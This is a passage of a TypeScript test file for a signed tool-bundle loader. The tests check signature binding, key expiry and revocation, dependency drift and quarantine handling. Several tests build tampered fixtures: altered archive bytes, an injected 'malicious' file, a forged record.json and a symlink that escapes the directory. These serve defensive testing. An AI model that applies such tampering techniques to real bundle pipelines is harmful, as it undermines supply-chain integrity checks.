      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      // Invalid manifest (missing required id)
      const invalidManifest = { ...validManifest, id: "" };
      const invalidArchive = await buildToolBundle({
        manifest: invalidManifest,
        files: [{ path: "src/index.ts", content: "export const x = 1;" }],
        signOptions: {
          keyId: keyPair.keyId,
          privateKeyPem: keyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      }).catch(() => null);

      // If build fails Zod schema, create raw archive without manifest
      const rawTarEntries = [
        {
          path: "manifest.json",
          content: Buffer.from(JSON.stringify({ invalid: true })),
          mode: 0o644,
          size: 17,
        },
        {
          path: "src/index.ts",
          content: Buffer.from("export const x = 1;"),
          mode: 0o644,
          size: 19,
        },
      ];

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "other.ts", content: "export const x = 1;" }],
        entrypoint: "src/index.ts",
      });

      await expect(
        loader.loadBundle(built.archiveBuffer, { development: true }),
      ).rejects.toThrowError(BundleValidationError);

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBe(1);
      expect(quarantined[0]?.reason).toBe("manifest_invalid");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects package dependency drift after qualification on initial load", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-pkg-drift-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-pkg-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const val = 42;";
      const approvedDeps = { lodash: "^4.17.21" };
      const qualificationBundle = createTestQualificationBundle(
        sourceCode,
        prodKeyPair,
        undefined,
        { dependencies: approvedDeps },
      );

      // Build bundle with drifted dependencies in package.json
      const driftedPackageJson = JSON.stringify({
        name: "test-pkg",
        version: "1.0.0",
        dependencies: { lodash: "^5.0.0" },
      });

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [
          { path: "src/index.ts", content: sourceCode },
          { path: "package.json", content: driftedPackageJson },
        ],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrowError(
        BundleValidationError,
      );

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBe(1);
      expect(quarantined[0]?.reason).toBe("approval_drift");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects cached bundle when package.json dependencies are tampered after initial load", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-pkg-cache-tamper-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-pkg-cache-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const cachedVal = 100;";
      const approvedDeps = { axios: "^1.6.0" };
      const qualificationBundle = createTestQualificationBundle(
        sourceCode,
        prodKeyPair,
        undefined,
        { dependencies: approvedDeps },
      );

      const validPackageJson = JSON.stringify({
        name: "test-pkg-cache",
        version: "1.0.0",
        dependencies: approvedDeps,
      });

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [
          { path: "src/index.ts", content: sourceCode },
          { path: "package.json", content: validPackageJson },
        ],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });
      // Initial load: successfully extracted and cached
      const loaded = await loader.loadBundle(built.archiveBuffer);
      expect(loaded.isApproved).toBe(true);
      expect(loaded.isCached).toBe(false);

      // Tamper with package.json in the cached directory on disk
      const cachedPkgPath = path.join(loaded.artifactDir, "package.json");
      fs.writeFileSync(
        cachedPkgPath,
        JSON.stringify({
          name: "test-pkg-cache",
          version: "1.0.0",
          dependencies: { axios: "^2.0.0-tampered" },
        }),
      );

      // Loading directly from directory must detect dependency drift and throw
      await expect(loader.loadBundle(loaded.artifactDir)).rejects.toThrow();
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });
  it("constructs verified qualification token with branded symbol and exact parsed dependencies matching signed package", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-token-brand-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-token-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = `
export async function execute(params: { query: string }) {
  return { result: "ok" };
}
`;
      const approvedDeps = { lodash: "^4.17.21", zod: "^3.22.0" };
      const qualificationBundle = createTestQualificationBundle(
        sourceCode,
        prodKeyPair,
        undefined,
        { dependencies: approvedDeps },
      );

      const validPackageJson = JSON.stringify({
        name: "test-pkg-token",
        version: "1.0.0",
        dependencies: approvedDeps,
      });

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [
          { path: "src/index.ts", content: sourceCode },
          { path: "package.json", content: validPackageJson },
        ],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      const loaded = await loader.loadBundle(built.archiveBuffer);
      expect(loaded.isApproved).toBe(true);
      expect(loaded.qualificationToken).toBeDefined();
      expect(loaded.qualificationToken?.[TOKEN_BRAND]).toBe(true);
      expect(isVerifiedQualificationToken(loaded.qualificationToken)).toBe(true);
      expect(isVerifiedQualificationToken(loaded)).toBe(true);

      const vData = getVerifiedQualificationData(loaded.qualificationToken);
      expect(vData).toBeDefined();
      expect(vData?.toolId).toBe(validManifest.id);
      expect(vData?.toolVersion).toBe(validManifest.version);
      expect(vData?.sourceDigest).toBe(qualificationBundle.approval.sourceDigest);
      expect(vData?.depDigest).toBe(qualificationBundle.approval.dependencyDigest);
      expect(vData?.schemaDigest).toBe(qualificationBundle.frozenIntent.inputSchemaDigest);
      expect(vData?.intentDigest).toBe(qualificationBundle.frozenIntent.intentDigest);
      expect(vData?.dependencies).toEqual(approvedDeps);
      expect(vData?.approval.decision).toBe("approved");
      expect(vData?.runs).toEqual(qualificationBundle.runs);
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects cached bundle when approved entrypoint is deleted on disk", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-entrypoint-deleted-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-entrypoint-del-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const entrypointTest = true;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Initial load: successfully extracted and cached
      const loaded = await loader.loadBundle(built.archiveBuffer);
      expect(loaded.isApproved).toBe(true);

      // Delete the entrypoint file from cached directory on disk
      const cachedEntrypoint = path.join(loaded.artifactDir, "src/index.ts");
      fs.unlinkSync(cachedEntrypoint);

      // Cache integrity check must fail
      const isIntegrityHealthy = await cache.verifyArtifactIntegrity(built.bundleDigest);
      expect(isIntegrityHealthy).toBe(false);

      // Loading directly from directory must reject with missing entrypoint error
      await expect(loader.loadBundle(loaded.artifactDir)).rejects.toThrowError(
        BundleValidationError,
      );
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects qualification signed by an expired key", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-expired-key-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const expiredKeyPair = generateBundleKeyPair("ed25519", "expired-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: expiredKeyPair.keyId,
          algorithm: expiredKeyPair.algorithm,
          publicKeyPem: expiredKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: "2025-01-01T00:00:00.000Z",
          expiresAt: new Date(Date.now() - 60000).toISOString(), // expired 1 minute ago
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const ok = 1;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, expiredKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: expiredKeyPair.keyId,
          privateKeyPem: expiredKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrowError(
        BundleSignatureError,
      );
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects qualification signed by a revoked key", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-revoked-key-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const revokedKeyPair = generateBundleKeyPair("ed25519", "revoked-key-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: revokedKeyPair.keyId,
          algorithm: revokedKeyPair.algorithm,
          publicKeyPem: revokedKeyPair.publicKeyPem,
          trustLevel: "revoked",
          createdAt: "2025-01-01T00:00:00.000Z",
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const ok = 1;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, revokedKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
      });

      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrowError(
        BundleSignatureError,
      );
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("deduplicates consequential actions using canonical tuple serialization without delimiter collisions", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-action-dedup-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");

      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-key-dedup-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: prodKeyPair.algorithm,
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore });

      const sourceCode = "export const multiAction = true;";
      const actions = [
        {
          actionType: "http:write",
          target: "resource",
          description: "Action 1: http:write on resource",
          requiresExplicitAuthorization: true,
          authorizationEvidence: "auth-ev-1",
        },
        {
          actionType: "http",
          target: "write:resource",
          description: "Action 2: http on write:resource",
          requiresExplicitAuthorization: true,
          authorizationEvidence: "auth-ev-2",
        },
      ];

      const qualificationBundle = createTestQualificationBundle(
        sourceCode,
        prodKeyPair,
        undefined,
        { consequentialActions: actions },
      );

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      const loaded = await loader.loadBundle(built.archiveBuffer);
      expect(loaded.isApproved).toBe(true);
      expect(loaded.effectProfile).toBeDefined();
      expect(loaded.effectProfile?.consequentialActions.actions.length).toBe(2);

      const loadedActions = loaded.effectProfile?.consequentialActions.actions ?? [];
      expect(
        loadedActions.some((a) => a.actionType === "http:write" && a.target === "resource"),
      ).toBe(true);
      expect(
        loadedActions.some((a) => a.actionType === "http" && a.target === "write:resource"),
      ).toBe(true);
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("preserves caller-owned directory in place when directory loading fails", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-preserve-dir-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const callerWorkspaceDir = path.join(tempRoot, "caller-workspace");

      fs.mkdirSync(callerWorkspaceDir, { recursive: true });
      fs.mkdirSync(path.join(callerWorkspaceDir, "src"), { recursive: true });

      // Write manifest and source code, but NO qualification.json in production mode
      fs.writeFileSync(
        path.join(callerWorkspaceDir, "manifest.json"),
        JSON.stringify(validManifest, null, 2),
      );
      fs.writeFileSync(
        path.join(callerWorkspaceDir, "src/index.ts"),
        "export const unapproved = 1;",
      );

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, development: false });

      // Loading unapproved directory must reject
      await expect(loader.loadBundle(callerWorkspaceDir)).rejects.toThrow();

      // CRITICAL: Caller-owned directory must remain intact in place!
      expect(fs.existsSync(callerWorkspaceDir)).toBe(true);
      expect(fs.existsSync(path.join(callerWorkspaceDir, "manifest.json"))).toBe(true);
      expect(fs.existsSync(path.join(callerWorkspaceDir, "src/index.ts"))).toBe(true);
      expect(fs.readFileSync(path.join(callerWorkspaceDir, "src/index.ts"), "utf8")).toBe(
        "export const unapproved = 1;",
      );

      // Quarantine must have an evidence snapshot
      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBe(1);
      expect(["unapproved_candidate", "signature_mismatch"]).toContain(quarantined[0]?.reason);
      expect(quarantined[0]?.quarantinePath).toBeDefined();
      expect(fs.existsSync(quarantined[0]!.quarantinePath)).toBe(true);
      expect(fs.existsSync(path.join(quarantined[0]!.quarantinePath, "manifest.json"))).toBe(true);
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects and quarantines when signed bundle has tampered extracted regular file bytes (RUNTIME-SIGNATURE-BINDING-001)", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-tamper-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-001");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      const sourceCode = "export const answer = 42;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Tamper with the tar archive content: replace index.ts content with altered bytes
      const parsedEntries = parseTarArchive(built.archiveBuffer);
      const tamperedEntries = parsedEntries.map((entry) => {
        if (entry.path === "src/index.ts") {
          return {
            path: entry.path,
            content: Buffer.from("export const answer = 99;"),
            mode: entry.mode,
            executable: false,
          };
        }
        return {
          path: entry.path,
          content: entry.content,
          mode: entry.mode,
          executable: false,
        };
      });

      const { archive: tamperedArchive } = encodeDeterministicTar(tamperedEntries);

      await expect(loader.loadBundle(tamperedArchive)).rejects.toThrow();

      // Must be quarantined with signature_mismatch
      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBeGreaterThanOrEqual(1);
      expect(quarantined[0]?.reason).toBe("signature_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects and quarantines when a signed file is missing from the bundle (RUNTIME-SIGNATURE-BINDING-001)", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-missing-file-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-002");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      const sourceCode = "export const helper = true;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [
          { path: "src/index.ts", content: sourceCode },
          { path: "src/helper.ts", content: "export const extra = 1;" },
        ],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Re-pack omitting helper.ts while keeping signature.json (which signed helper.ts)
      const parsedEntries = parseTarArchive(built.archiveBuffer);
      const missingEntries = parsedEntries
        .filter((e) => e.path !== "src/helper.ts")
        .map((e) => ({
          path: e.path,
          content: e.content,
          mode: e.mode,
          executable: false,
        }));

      const { archive: missingArchive } = encodeDeterministicTar(missingEntries);

      await expect(loader.loadBundle(missingArchive)).rejects.toThrow();

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBeGreaterThanOrEqual(1);
      expect(quarantined[0]?.reason).toBe("signature_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects and quarantines when an extra unsigned file is injected into the bundle (RUNTIME-SIGNATURE-BINDING-001)", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-extra-file-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-003");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      const sourceCode = "export const clean = true;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);

      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      // Inject unexpected file
      const parsedEntries = parseTarArchive(built.archiveBuffer);
      const injectedEntries = parsedEntries.map((e) => ({
        path: e.path,
        content: e.content,
        mode: e.mode,
        executable: false,
      }));
      injectedEntries.push({
        path: "src/injected.ts",
        content: Buffer.from("console.log('malicious');"),
        mode: 0o644,
        executable: false,
      });

      const { archive: injectedArchive } = encodeDeterministicTar(injectedEntries);

      await expect(loader.loadBundle(injectedArchive)).rejects.toThrow();

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBeGreaterThanOrEqual(1);
      expect(quarantined[0]?.reason).toBe("signature_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects when manifest parameter schema is altered after qualification (RUNTIME-QUALIFICATION-BINDING-002)", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-schema-alter-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-004");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      const sourceCode = "export const ok = 1;";
      // Qualification signed for original validManifest.parameters
      const qualificationBundle = createTestQualificationBundle(
        sourceCode,
        prodKeyPair,
        undefined,
        {
          manifest: validManifest,
        },
      );

      // Altered manifest parameters
      const alteredManifest: ToolManifest = {
        ...validManifest,
        parameters: {
          type: "object",
          properties: {
            query: { type: "string" },
            injectedField: { type: "number" },
          },
          required: ["query", "injectedField"],
        },
      };

      const built = await buildToolBundle({
        manifest: alteredManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrow(
        /Input schema digest mismatch/,
      );
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects when manifest identity does not match qualification metadata (RUNTIME-QUALIFICATION-BINDING-002)", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-identity-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-005");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      const sourceCode = "export const run = true;";
      // Qualification specified toolId = "test-tool-loader" and toolVersion = "1.0.0"
      const qualificationBundle = createTestQualificationBundle(
        sourceCode,
        prodKeyPair,
        undefined,
        {
          toolId: "test-tool-loader",
          toolVersion: "1.0.0",
        },
      );

      // Manifest has drifted version "2.0.0"
      const driftedManifest: ToolManifest = {
        ...validManifest,
        version: "2.0.0",
      };

      const built = await buildToolBundle({
        manifest: driftedManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
        signOptions: {
          keyId: prodKeyPair.keyId,
          privateKeyPem: prodKeyPair.privateKeyPem,
          algorithm: "ed25519",
        },
      });

      await expect(loader.loadBundle(built.archiveBuffer)).rejects.toThrow(
        /Manifest tool version '2.0.0' does not match/,
      );
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("hardens quarantine directory against malicious symlinks and reserves record.json (RUNTIME-QUARANTINE-SYMLINK-008)", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "quarantine-symlink-test-"));
    try {
      const quarantineDir = path.join(tempRoot, "quarantine");
      const quarantine = new QuarantineManager({ quarantineDir });
      const maliciousDir = path.join(tempRoot, "malicious_src");
      fs.mkdirSync(maliciousDir, { recursive: true });

      // Regular file
      fs.writeFileSync(path.join(maliciousDir, "data.txt"), "regular content");
      // Malicious colliding record.json
      fs.writeFileSync(
        path.join(maliciousDir, "record.json"),
        JSON.stringify({ fake: "attacker record" }),
      );
      // Symlink pointing outside
      const outsideTarget = path.join(tempRoot, "sensitive.txt");
      fs.writeFileSync(outsideTarget, "sensitive host file");
      try {
        fs.symlinkSync(outsideTarget, path.join(maliciousDir, "symlink_escape.txt"));
      } catch {
        // If OS environment prohibits symlinks, proceed
      }

      const record = await quarantine.quarantineDirectory(maliciousDir, "symlink_escape", {
        custom: 123,
      });
      expect(record).toBeDefined();
      expect(record.reason).toBe("symlink_escape");

      // The quarantine target directory must exist
      const targetDir = record.quarantinePath;
      expect(fs.existsSync(targetDir)).toBe(true);

      // The record.json in targetDir must be the authentic QuarantineRecord, NOT the attacker's fake record
      const recordContent = JSON.parse(
        fs.readFileSync(path.join(targetDir, "record.json"), "utf8"),
      );
      expect(recordContent.quarantineId).toBe(record.quarantineId);
      expect(recordContent.reason).toBe("symlink_escape");

      // The attacker's record.json must have been renamed to source_record.json
      expect(fs.existsSync(path.join(targetDir, "source_record.json"))).toBe(true);

      // The symlink must NOT have been copied into targetDir
      expect(fs.existsSync(path.join(targetDir, "symlink_escape.txt"))).toBe(false);

      // getQuarantined and listQuarantined must return valid authentic record
      const retrieved = await quarantine.getQuarantined(record.quarantineId);
      expect(retrieved?.quarantineId).toBe(record.quarantineId);
      expect(retrieved?.reason).toBe("symlink_escape");

      const list = await quarantine.listQuarantined();
      expect(list.some((r) => r.quarantineId === record.quarantineId)).toBe(true);
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects unsigned bundle in production mode even with requireSignature: false override", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-unsigned-override-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-override-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      const sourceCode = "export const unverified = 1;";
      const qualificationBundle = createTestQualificationBundle(sourceCode, prodKeyPair);

      // Unsigned bundle (no signOptions)
      const built = await buildToolBundle({
        manifest: validManifest,
        files: [{ path: "src/index.ts", content: sourceCode }],
        qualification: qualificationBundle,
      });

      // In production mode, requireSignature: false must NOT disable signature requirement
      await expect(
        loader.loadBundle(built.archiveBuffer, { requireSignature: false }),
      ).rejects.toThrowError(BundleSignatureError);

      const quarantined = await quarantine.listQuarantined();
      expect(quarantined.length).toBeGreaterThanOrEqual(1);
      expect(quarantined[0]?.reason).toBe("signature_mismatch");
    } finally {
      fs.rmSync(tempRoot, { recursive: true, force: true });
    }
  });

  it("rejects package-lock graph drift against approved qualification", async () => {
    const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "loader-lock-drift-test-"));
    try {
      const cacheDir = path.join(tempRoot, "artifacts");
      const quarantineDir = path.join(tempRoot, "quarantine");
      const prodKeyPair = generateBundleKeyPair("ed25519", "prod-signer-lock-01");
      const keyStore = new InMemoryKeyStore([
        {
          keyId: prodKeyPair.keyId,
          algorithm: "ed25519",
          publicKeyPem: prodKeyPair.publicKeyPem,
          trustLevel: "production",
          createdAt: new Date().toISOString(),
        },
      ]);

      const cache = new ArtifactCache({ cacheDir });
      const quarantine = new QuarantineManager({ quarantineDir });
      const loader = new ToolBundleLoader({ cache, quarantine, keyStore, development: false });

      const sourceCode = "export const ok = 1;";
      const validPkg = {
        name: "test-lock-pkg",
        version: "1.0.0",
        dependencies: { lodash: "^4.17.21" },
      };
      const validLock = {
        name: "test-lock-pkg",
        version: "1.0.0",
        lockfileVersion: 3,
        packages: { "node_modules/lodash": { version: "4.17.21", integrity: "sha512-abc" } },
      };
      const lockGraphDigest = computeSha256(canonicalJson({ package: validPkg, lock: validLock }));

      const qualificationBundle = createTestQualificationBundle(
        sourceCode,
        prodKeyPair,
        undefined,
        {
          depDigest: lockGraphDigest,
          dependencies: validPkg.dependencies,
        },
      );

      // Altered lockfile with tampered integrity
      const driftedLock = {
        name: "test-lock-pkg",
        version: "1.0.0",
        lockfileVersion: 3,
        packages: {
